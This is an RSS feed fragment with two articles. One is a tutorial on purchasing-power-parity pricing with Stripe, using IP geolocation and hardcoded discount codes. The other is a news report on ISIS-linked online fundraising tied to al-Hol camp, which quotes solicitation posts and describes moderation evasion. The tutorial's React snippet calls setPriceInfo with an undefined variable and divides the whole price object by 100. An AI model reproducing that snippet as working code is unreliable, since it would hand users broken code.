<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/d47327fa9522392a5009fef25b1f836981abaa1f/3d937/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/a2c094b1d8b44c5f1ea3ef44d391d0dec2c068cb/3ec42/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/9bdd1b77ea9ee0ed0e1fc079ed510eb9a3121f62/17699/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/3f4034f0f2b2f2b83c6eb424d79bdf5522b1687f/b5bde/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/06ffd1a5f92914ce63c4b058beec8557a8b3407f/cd12d/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/a7125c64cb2e8a9a09dc8edde1fedda06432effe/6d558/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.200.png 200w, https://d33wubrfki0l68.cloudfront.net/f8f6ee8c9f90d1d40d3c433612a117a110cba327/87cb2/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.450.png 450w, https://d33wubrfki0l68.cloudfront.net/e6102bfa6ed5a21a19b77cff29e09daf536e8ce9/bd307/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.700.png 700w, https://d33wubrfki0l68.cloudfront.net/9b9b3ea48371b45602f9534f281c2419a00818d3/b9b83/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.950.png 950w, https://d33wubrfki0l68.cloudfront.net/34f8205cb9ad084242039ab7da06b85be56b2d1f/88bfe/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.1200.png 1200w" sizes="100vw" type="image/png"><img src="https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/parity.coffee-screenshot.png" alt="" height="822.2029488291414" width="1200" loading="lazy"></picture><figcaption><a href="https://parity.coffee/">parity.coffee</a>: a demo site using PPP</figcaption></figure>
<p>For the payment with Stripe, I tried to be as close as possible to what they describe in <a href="https://stripe.com/docs/checkout/integration-builder">their documentation about accepting a payment</a>.</p>
<h3 id="option-%231%3A-adjust-the-price-automatically">Option #1: adjust the price automatically</h3>
<p>The first solution I tried on my course was to offer a price automatically inferred from the user’s country, using geolocation of their IP address.</p>
<p>This can be done using <a href="https://www.npmjs.com/package/request-ip"><code>request-ip</code></a> and <a href="https://www.npmjs.com/package/geoip-lite"><code>geoip-lite</code></a> packages with Node.js:</p>
<pre><code><span>async</span> <span>function</span> <span>getCountryForRequest</span><span>(</span><span>req</span><span>)</span> <span>{</span><br>  <span>try</span> <span>{</span><br>    <span>const</span> clientIp <span>=</span> requestIp<span>.</span><span>getClientIp</span><span>(</span>req<span>)</span><br>    <span>return</span> geoip<span>.</span><span>lookup</span><span>(</span>clientIp<span>)</span><span>.</span>country <span>||</span> <span>null</span><br>  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span><br>    console<span>.</span><span>error</span><span>(</span>err<span>)</span><br>    <span>return</span> <span>null</span><br>  <span>}</span><br><span>}</span></code></pre>
<p>When you have the country, the next step is to get the <em>PPP conversion factor</em> for this country. I used an <a href="https://purchasing-power-parity.com/">API</a> created by <a href="https://twitter.com/rwieruch">Robin Wieruch</a>. Still, you can also use any list you find on the Internet with countries associated with their PPP conversion factor (or any other index: Spotify subscription price, Big Mac index…)</p>
<pre><code><span>async</span> <span>function</span> <span>getConversionFactorForCountry</span><span>(</span><span>country</span><span>)</span> <span>{</span><br>  <span>try</span> <span>{</span><br>    <span>const</span> url <span>=</span> <span><span>`</span><span>https://api.purchasing-power-parity.com/?target=</span><span><span>${</span>country<span>}</span></span><span>`</span></span><br>    <span>const</span> res <span>=</span> <span>await</span> <span>fetch</span><span>(</span>url<span>)</span><br>    <span>const</span> <span>{</span> ppp <span>}</span> <span>=</span> <span>await</span> res<span>.</span><span>json</span><span>(</span><span>)</span><br>    <span>return</span> ppp<span>.</span>pppConversionFactor<br>  <span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span><br>    console<span>.</span><span>error</span><span>(</span>err<span>)</span><br>    <span>return</span> <span>1</span><br>  <span>}</span><br><span>}</span></code></pre>
<p>Last step: we use the conversion factor to calculate your product's price dynamically from the user’s request.</p>
<pre><code><span>import</span> <span>{</span> <span>BASE_PRICE</span> <span>}</span> <span>from</span> <span>'../prices'</span><br><p><span>async</span> <span>function</span> <span>getPriceFromRequest</span><span>(</span><span>req</span><span>)</span> <span>{</span><br>  <span>const</span> country <span>=</span> <span>await</span> <span>getCountryForRequest</span><span>(</span>req<span>)</span><br>  <span>const</span> pppConversionFactor <span>=</span><br>    <span>(</span>country <span>&amp;&amp;</span> <span>(</span><span>await</span> <span>getConversionFactorForCountry</span><span>(</span>country<span>)</span><span>)</span><span>)</span> <span>||</span> <span>1</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&gt;=</span> <span>1</span><span>)</span> <span>{</span><br>    <br>    <br>    <span>return</span> <span>{</span> price<span>:</span> <span>BASE_PRICE</span><span>,</span> discount<span>:</span> <span>0</span><span>,</span> country <span>}</span><br>  <span>}</span><br>  <span>const</span> price <span>=</span> Math<span>.</span><span>round</span><span>(</span><span>BASE_PRICE</span> <span>*</span> pppConversionFactor<span>)</span><br>  <span>const</span> discount <span>=</span> Math<span>.</span><span>round</span><span>(</span><span>100</span> <span>*</span> <span>(</span><span>1</span> <span>-</span> price <span>/</span> <span>BASE_PRICE</span><span>)</span><span>)</span><br>  <span>return</span> <span>{</span> price<span>,</span> discount<span>,</span> country <span>}</span><br><span>}</span></p></code></pre>
<p>This function has to be called at least in two places:</p>
<ul>
<li>in an endpoint called to display the price on your page, and</li>
<li>in the endpoint used to create the checkout session.</li>
</ul>
<p>To display the price on my course page, I created an endpoint <code>/api/get-price</code>, with this function:</p>
<pre><code><span>async</span> <span>function</span> <span>getPrice</span><span>(</span><span>req<span>,</span> res</span><span>)</span> <span>{</span><br>  <span>const</span> <span>{</span> price<span>,</span> discount<span>,</span> country <span>}</span> <span>=</span> <span>await</span> <span>getPriceFromRequest</span><span>(</span>req<span>)</span><br>  res<span>.</span><span>send</span><span>(</span><span>{</span> price<span>,</span> discount<span>,</span> country <span>}</span><span>)</span><br><span>}</span></code></pre>
<p>Notice that I also return the discount (vs. the base price) and the country; they will be useful, as we’ll see in a minute.</p>
<p>I call this endpoint in my component, using a combination of <code>useState</code> and <code>useEffect</code> hooks:</p>
<pre><code><span>const</span> <span>[</span>priceInfo<span>,</span> setPriceInfo<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><p><span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><br>  <span>fetch</span><span>(</span><span>'/api/get-price'</span><span>)</span><br>    <span>.</span><span>then</span><span>(</span><span>(</span><span>res</span><span>)</span> <span>=&gt;</span> res<span>.</span><span>json</span><span>(</span><span>)</span><span>)</span><br>    <span>.</span><span>then</span><span>(</span><span>(</span><span>priceInfo</span><span>)</span> <span>=&gt;</span> <span>setPriceInfo</span><span>(</span>price<span>)</span><span>)</span><br>    <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=&gt;</span> console<span>.</span><span>error</span><span>(</span>err<span>)</span><span>)</span><br><span>}</span><span>,</span> <span>[</span><span>]</span><span>)</span></p></code></pre>
<p>I can then display this price in my page:</p>
<pre><code><span><span><span>&lt;</span>span</span><span>&gt;</span></span><span><br>  </span><span>{</span>priceInfo <span>?</span> <span>(</span><br>    <br>    <span><span><span>&lt;</span>span</span><span>&gt;</span></span><span>$</span><span>{</span><span>(</span>priceInfo <span>/</span> <span>100</span><span>)</span><span>.</span><span>toFixed</span><span>(</span><span>2</span><span>)</span><span>}</span><span><span><span>&lt;/</span>span</span><span>&gt;</span></span><br>  <span>)</span> <span>:</span> <span>(</span><br>    <span><span><span>&lt;</span>span</span><span>&gt;</span></span><span>Loading…</span><span><span><span>&lt;/</span>span</span><span>&gt;</span></span><br>  <span>)</span><span>}</span><span><br></span><span><span><span>&lt;/</span>span</span><span>&gt;</span></span></code></pre>
<p>I also asked the question (to myself and on Twitter): should I inform the user that they got a discount because of their location? And the answer I got (and it seems very wise) was <a href="https://twitter.com/scastiel/status/1360224976339664897">a big YES</a>.</p>
<p>So we can use the <code>country</code> and the <code>discount</code> returned by the endpoint to display a customized message:</p>
<pre><code><span>{</span><br>  priceInfo<span>.</span>discount <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>(</span><br>    <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span><br>      </span><span>{</span>countryEmoji<span>}</span><span> Hey! It looks like you are from </span><span>{</span>countryName<span>}</span><span>. We support<br>      Purchasing Power Parity so we automatically adjusted the price, adding a<br>      discount of </span><span>{</span>priceInfo<span>.</span>discount<span>}</span><span>%.<br>    </span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><br>  <span>)</span><br><span>}</span></code></pre>
<p><a href="https://github.com/scastiel/parity.coffee/blob/main/lib/country.js">Have a look here to know how to get the country name and emoji 😉</a></p>
<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/d9c55dadd3e74061e41eec9b785859ce648aa1e7/46cf9/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/53dbed2b8b4a3deafe64b4313ddaf00030e60de5/799f8/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/4b0af02954f41c3463c70e3d9e9762496e88fa8d/0139a/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/10df8651b1d64711bc15d0aadbbb85ed80efebf2/00c3d/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/5ce3cb2a10735adc4679904e8cdb9a49719906d6/1a406/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.976.webp 976w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/550dbcc50c62bef3fb76b8a68aa084de7d1f290a/3d702/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.200.png 200w, https://d33wubrfki0l68.cloudfront.net/ed1110c20f7bf5de6df8eca4dd23c254c3609edf/4d449/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.450.png 450w, https://d33wubrfki0l68.cloudfront.net/2e6b14fccd9ce771d42c8bdd2e6d6afbd6bf2059/6f53e/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.700.png 700w, https://d33wubrfki0l68.cloudfront.net/217540241a39494ca1e86dac8b1920706401ed1d/43f1e/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.950.png 950w, https://d33wubrfki0l68.cloudfront.net/e551a64feaab7e852c15413b8d2fc68f273d049b/304ac/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.976.png 976w" sizes="100vw" type="image/png"><img src="https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/message1.png" alt="" height="326" width="976" loading="lazy"></picture><figcaption>Displaying a message to inform the user a discount was applied.</figcaption></figure>
<p>Ok, the price is automatically adjusted on the page, but we still need to adjust it when the user goes to the checkout page on Stripe. To do this, we have to call our <code>getPriceFromRequest</code> function in the <code>create-checkout-session</code> endpoint used to <a href="https://stripe.com/docs/api/checkout/sessions/create">create the Stripe session</a>:</p>
<pre><code><span>export</span> <span>default</span> <span>async</span> <span>function</span> <span>createCheckoutSession</span><span>(</span><span>req<span>,</span> res</span><span>)</span> <span>{</span><br>  <span>const</span> <span>{</span> price <span>}</span> <span>=</span> <span>await</span> <span>getPriceFromRequest</span><span>(</span>req<span>)</span><p>  <span>const</span> session <span>=</span> <span>await</span> stripe<span>.</span>checkout<span>.</span>sessions<span>.</span><span>create</span><span>(</span><span>{</span><br>    payment_method_types<span>:</span> <span>[</span><span>'card'</span><span>]</span><span>,</span><br>    line_items<span>:</span> <span>[</span><br>      <span>{</span><br>        price_data<span>:</span> <span>{</span><br>          currency<span>:</span> <span>'usd'</span><span>,</span><br>          product_data<span>:</span> <span>{</span> name<span>:</span> <span>'One coffee'</span> <span>}</span><span>,</span><br>          unit_amount<span>:</span> price<span>,</span><br>        <span>}</span><span>,</span><br>        quantity<span>:</span> <span>1</span><span>,</span><br>      <span>}</span><span>,</span><br>    <span>]</span><span>,</span><br>    mode<span>:</span> <span>'payment'</span><span>,</span><br>    success_url<span>:</span> <span><span>`</span><span><span>${</span>process<span>.</span>env<span>.</span><span>DOMAIN</span><span>}</span></span><span>?success=true</span><span>`</span></span><span>,</span><br>    cancel_url<span>:</span> <span><span>`</span><span><span>${</span>process<span>.</span>env<span>.</span><span>DOMAIN</span><span>}</span></span><span>?cancel=true</span><span>`</span></span><span>,</span><br>  <span>}</span><span>)</span><br>  res<span>.</span><span>json</span><span>(</span><span>{</span> id<span>:</span> session<span>.</span>id <span>}</span><span>)</span><br><span>}</span></p></code></pre>
<p>With this solution, the discount is almost transparent for the user (we still display a message to inform them). They could almost believe that the price they see is the same as everyone sees.</p>
<p>When I thought about it, something didn’t feel perfect with this solution. I felt the discount would be more convincing if the user had to enter a code during the checkout, so I tested the second option.</p>
<h2 id="option-%232%3A-offer-a-discount-code">Option #2: offer a discount code</h2>
<p>This option’s implementation is not very different from the first one. First, we’ll need the same functions <code>getCountryForRequest</code> and <code>getConversionFactorForCountry</code>. But, whereas in the previous implementation, we calculated the price using the conversion factor, this time, we’ll infer a discount code from this factor.</p>
<p>The idea is to define that for a factor between 0.9 and 1 there will be a code, another one for factors between 0.8 and 0.9, etc. You can put this association in a database for instance, but for my case it was good enough to hardcode them:</p>
<pre><code><span>function</span> <span>getDiscountForConversionFactor</span><span>(</span><span>pppConversionFactor</span><span>)</span> <span>{</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>0.1</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'CSVVSDVV'</span><span>,</span> discount<span>:</span> <span>90</span> <span>}</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>0.2</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'LLSJDLWF'</span><span>,</span> discount<span>:</span> <span>80</span> <span>}</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>0.3</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'KRUFLDLF'</span><span>,</span> discount<span>:</span> <span>70</span> <span>}</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>0.4</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'PJLKHJHI'</span><span>,</span> discount<span>:</span> <span>60</span> <span>}</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>0.5</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'AGEFDXSL'</span><span>,</span> discount<span>:</span> <span>50</span> <span>}</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>0.6</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'FDJGFYLX'</span><span>,</span> discount<span>:</span> <span>40</span> <span>}</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>0.7</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'SYSDJSMF'</span><span>,</span> discount<span>:</span> <span>30</span> <span>}</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>0.8</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'WUEJCCFJ'</span><span>,</span> discount<span>:</span> <span>20</span> <span>}</span><br>  <span>if</span> <span>(</span>pppConversionFactor <span>&lt;=</span> <span>1.0</span><span>)</span> <span>return</span> <span>{</span> code<span>:</span> <span>'DHFVUFKE'</span><span>,</span> discount<span>:</span> <span>10</span> <span>}</span><br>  <span>return</span> <span>{</span> code<span>:</span> <span>null</span><span>,</span> discount<span>:</span> <span>null</span> <span>}</span><br><span>}</span></code></pre>
<p>Note that I offer a discount for countries with a PPP of 1 (but not higher). I think being offered a discount code is always well-perceived by visitors.</p>
<p>Of course, the codes you have here must exist for your Stripe product, and they must remain secret! (These are for <a href="https://parity.coffee/">parity.coffee</a> and can be used freely 😉.)</p>
<p>This time, you don’t have to fetch the price from an endpoint (it will be the same for everyone), but you have to fetch the user’s country's discount code.</p>
<pre><code><span>async</span> <span>function</span> <span>getPrice</span><span>(</span><span>req<span>,</span> res</span><span>)</span> <span>{</span><br>  <span>const</span> country <span>=</span> <span>await</span> <span>getCountryForRequest</span><span>(</span>req<span>)</span><br>  <span>const</span> pppConversionFactor <span>=</span><br>    <span>(</span>country <span>&amp;&amp;</span> <span>(</span><span>await</span> <span>getConversionFactorForCountry</span><span>(</span>country<span>)</span><span>)</span><span>)</span> <span>||</span> <span>1</span><br>  <span>const</span> <span>{</span> discount<span>,</span> code <span>}</span> <span>=</span> <span>await</span> <span>getDiscountForConversionFactor</span><span>(</span><br>    pppConversionFactor<br>  <span>)</span><br>  res<span>.</span><span>send</span><span>(</span><span>{</span> discount<span>,</span> code<span>,</span> country <span>}</span><span>)</span><br><span>}</span></code></pre>
<p>Same as before, let’s …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/">https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/</a></em></p>]]>
            </description>
            <link>https://scastiel.dev/posts/2021-02-22-implement-ppp-fair-pricing-for-your-product/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26225110</guid>
            <pubDate>Mon, 22 Feb 2021 14:48:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Are these online pleas for humanitarian aid or ISIS fundraising?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26224980">thread link</a>) | @gbseventeen3331
<br/>
February 22, 2021 | https://restofworld.org/2021/humanitarian-aid-or-isis-fundraising/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/humanitarian-aid-or-isis-fundraising/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p><span>I</span>t’s the kind of picture that most Facebook users would scroll by without pause: the sun hanging low in a blue sky, half-hidden by the silhouette of a tent. “Donate [for the sake of Allah] to free your imprisoned sisters,” a line of embedded text reads, with the hashtag #CampHol. “Contact to help us,” the caption adds, including the name of a Telegram account.</p>



<p>Even a user who did take the time to look closer might assume the post was related to an Islamic charity or perhaps a fundraiser for human trafficking victims, then move on. Its intended audience, however, would immediately recognize the link to ISIS.</p>



<p>Al-Hol refugee camp in Kurdish-controlled northeastern Syria is home to the women and children who lived in ISIS’s last remaining pockets of territory before they were retaken by the Syrian Democratic Forces in March 2019. The majority of residents are Iraqi and Syrian, but there is also a separate annex for women who traveled to live in the so-called caliphate. These women, some of whom emigrated from Europe, Asia, and Africa, are seen by locals as more fanatical than those in other parts of the camp. A United Nations <a href="https://reliefweb.int/report/syrian-arab-republic/syrian-arab-republic-north-east-syria-al-hol-camp-21-november-2019">report</a> from November 2019 found that foreigners made up 15% of the camp’s total population of 70,000, although some have since been repatriated or moved to more secure facilities.</p>



<p>A sprawling mass of dusty tents surrounded by fences and armed guards, al-Hol’s foreigners’ annex has become a place of radicalization and extremism. There, hard-line Islamists have reimposed ISIS’s draconian rules <strong>—</strong> any woman or girl over eight must be fully veiled in black; communication with authorities or journalists is forbidden; daily prayer is mandatory —<strong> </strong>and been known to beat and murder transgressors. With resources already overextended, the camp staff have little ability to intervene.</p>



<p>Last year, online fundraisers began to appear on behalf of al-Hol residents. Many were seeking to finance escapes, others to pay for food and supplies. (While some donations have likely gone toward terrorism, the campaigns are careful to avoid mentioning violence.) The petitions spread via social networks, including Facebook, Instagram, and Twitter, and often involved PayPal and other payment systems as well as messaging apps, like WhatsApp and Telegram. Before long, intelligence and law enforcement agencies began to monitor them.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Screenshot-2020-12-11-at-23.45.57-40x72.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Screenshot-2020-12-11-at-23.45.57-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Screenshot-2020-12-11-at-23.45.57-400x724.png 400w, https://restofworld.org/wp-content/uploads/2021/02/Screenshot-2020-12-11-at-23.45.57-600x1086.png 600w, " sizes="300px" alt="Last year, fundraisers started appearing on social media on behalf of al-Hol residents.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder">Facebook</span>
			</figcaption>
		</figure>


<p>Media reports followed, and any platform that was not already aware of the campaigns’ existence was soon clued in. Even so, several months later, this kind of content remains relatively easy to find. <em>Rest of World </em>was able to identify dozens of Facebook accounts claiming to be linked to al-Hol, many of which post comments glorifying ISIS or soliciting funds. “Do not fear the imprisonment of the [unbelievers] for helping your sisters,” reads one, inviting supporters to message privately for more information. On Instagram, an account consisting mostly of images and videos from al-Hol included a picture of a figure clad all in black holding up a cardboard sign. It reads, “WE ARE TWO SISTERS FROM CAMP AL HOL AND WE ARE TRYING TO ESCAPE … WE COLLECTED 13,000$ AND WE NEED 3000$ PLEASE WE BEG THE UMMAH TO HELP US AND DONATE AS MUCH AS THEY CAN.” Below, a caption elaborating on the message is translated into Turkish, English, Russian, and French.</p>



<p>Accounts like these often remain active for months. This is possible, in part, because campaigns extend across multiple networks and payment platforms, creating a complex and opaque ecosystem that sometimes mixes illegal payment solicitations with requests for legitimate charitable giving. As major social media companies scramble to figure out policies around hate speech and disinformation, ISIS-related fundraisers have continued to slip through.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/al-hol-04854-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/al-hol-04854-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/al-hol-04854-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/al-hol-04854-600x401.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/al-hol-04854-1000x668.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/al-hol-04854-1600x1069.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/al-hol-04854-2800x1870.jpg 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="Women stand at a registration office at al-Hol camp, looking for documents in their phones they need to print to apply for permission to leave the camp.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<hr>



<p><strong>In the more</strong> than five years that ISIS held territory in Iraq and Syria, it generated vast sums of money — from oil fields, plundering banks, drug and artifact smuggling, taxing people living under its regime, and taking hostages. The French government alone was <a href="http://www.focus.de/politik/ausland/krise-in-der-arabischen-welt/syrien/paris-zahlt-loesegeld-18-millionen-dollar-fuer-entfuehrte-journalisten_id_3800633.html">reported</a> to have paid an $18 million ransom to secure the release of four journalists. (A government spokesman denied this account.)</p>



<p>Although the revenues generated by online campaigns are minuscule in comparison, they are not insignificant — Audrey L. Alexander, a researcher and instructor at West Point’s Combating Terrorism Center, told <em>Rest of World</em> that she regularly encounters crowdfunding efforts by terrorists, some of which bring in as much as $2,000 — and this income likely helps keep ISIS activities going. It’s impossible to say with any certainty how much ISIS receives in online donations, but the money has been linked to escapes, weapons purchases, and propaganda produced by al-Hol-linked accounts, which have replaced the high-production-value videos once released by ISIS’s media arm.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/IMG_1496-40x87.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/IMG_1496-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/IMG_1496-400x866.png 400w, https://restofworld.org/wp-content/uploads/2021/02/IMG_1496-600x1299.png 600w, " sizes="(max-width: 640px) 100vw, 300px" alt="As major social media companies scramble to figure out policies around hate speech and disinformation, ISIS-related fundraisers have continued to slip through.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder">Instagram</span>
			</figcaption>
		</figure>


<p>In a March <a href="https://media.defense.gov/2020/May/13/2002298979/-1/-1/1/LIG_OIR_Q2_MAR2020_GOLD_508_0513.PDF">report</a> to Congress, the American-led coalition against ISIS, Operation Inherent Resolve, detailed how women within the camps, and particularly al-Hol, have built up a network for smuggling people and supplies, while simultaneously recruiting and indoctrinating new members. “Using funds received via wire transfers,” the authors noted, “female ISIS members continued to conduct operations — such as attacks against camp security personnel.” While this amplified existing pressure on social media companies to better monitor their platforms, it didn’t appear to have any major policy impacts.</p>



<p>The architects of these networks tailor their messages and methods to geography, specific donors and goals, and national laws and platform regulations. Of the Facebook accounts identified by <em>Rest of World</em> that claim links to al-Hol, only some explicitly asked for donations. Others disseminated pictures or news from the camp in different languages, alongside Islamic scripture and memes. A few users fondly reminisced about their time in the caliphate. Facebook disables and deletes accounts that share terrorist propaganda, so ISIS was never explicitly mentioned. Instead, references to the organization were camouflaged by alternative spellings. “I miss the Dawl@,” one said, with a crying emoji, referencing the Arabic word for “state” in ISIS’s full name.</p>



<p>Facebook says it has been making major investments to combat the proliferation of terrorist content on its platform. Much of that relies on AI and on media-matching software that finds images, text, or videos that are either identical or near identical to content that has already been taken down. Once identified, they are removed nearly instantly.</p>



<p>“Facebook has no tolerance for terrorist propaganda or content fundraising for terrorist groups. We take this extremely seriously and we are investing heavily to keep people safe,” a spokesperson told <em>Rest of World</em> in an emailed statement. “Over the last few years we’ve tripled the size of our safety and security team to 35,000 and built artificial intelligence technology to find and remove this content before people see it and report it to us. From June to September 2020, we removed over 9.7 million pieces of terrorist content on Facebook, 99% of which we detected proactively.”</p>



<p>While undoubtedly effective, aggressive AI-based content removal isn’t perfect. Journalists across the Middle East and North Africa regularly have their Facebook and Twitter accounts <a href="https://www.nbcnews.com/tech/tech-news/facebook-doesn-t-care-activists-say-accounts-removed-despite-zuckerberg-n1231110">suspended</a> after posting material related to conflicts or human rights abuses. Charities working with Syrian refugees have for years complained about <a href="https://slate.com/technology/2020/02/paypal-venmo-iran-syria-sanctions-crime-detection-system.html">PayPal’s keyword filters</a> blocking donations. And as social media companies get faster at taking down content, often without anyone having seen it, <a href="https://www.hrw.org/report/2020/09/10/video-unavailable/social-media-platforms-remove-evidence-war-crimes">human rights groups</a> and activists worry that they may be erasing vital evidence of war crimes that could be of use in future trials.</p>



<p>AI has other weaknesses too. Accounts that are more subtle about illegal affiliations may go unnoticed, allowing disguised ISIS content to slip through. Of the more than 40 apparently al-Hol-linked Facebook accounts found by <em>Rest of World</em> in October, only around half had been removed by December. Additionally, account administrators often maintain a network of duplicate or backup accounts, so that if one is blocked or removed, others are ready to take its place.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/al-hol-05136-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/al-hol-05136-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/al-hol-05136-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/al-hol-05136-600x401.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/al-hol-05136-1000x668.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/al-hol-05136-1600x1069.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/al-hol-05136-2800x1870.jpg 2800w, " sizes="(max-width: 640px) 100vw, calc(100vw - 40px)" alt="Women and children walk through al-Hol camp.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<hr>



<p><strong>In contrast to</strong> Facebook, Telegram has relatively few safeguards against terrorist content. Launched in 2013 by Russians Nikolai and Pavel Durov, the Dubai-based company is <a href="https://restofworld.org/2020/silk-road-is-dead-long-live-silk-road/">known for prioritizing privacy and free speech over nearly all other concerns.</a> This stance has made it popular among people living in authoritarian regimes, and it has also made it the app of choice for violent extremists. The company has conducted coordinated sweeps to remove ISIS content, but channels openly devoted to ISIS news and propaganda still regularly appear — including ones that raise money for escape attempts from al-Hol. (Telegram did not respond to requests for comment.)</p>



<p>While many jurisdictions hold the person who posts illegal content — rather than the platform itself — accountable, that may be changing in the U.K. and the E.U., where new draft legislation being considered would place responsibility on platforms to police themselves.</p>



<p>Vera Mironova, a visiting fellow at Harvard University who has extensively monitored online terrorist fundraising campaigns, notes that posts follow the mores of their host platform. “So secretive campaigns would not be posted on Facebook, or if they were, they would sound more humanitarian and not use words like ‘ISIS.’ But the ones on Telegram go full hurrah,” she explained. This same dynamic plays out on a country-by-country level, Mironova added, and is especially apparent on payment platforms. “Some countries — let’s say Russia or parts of …</p></div></div>
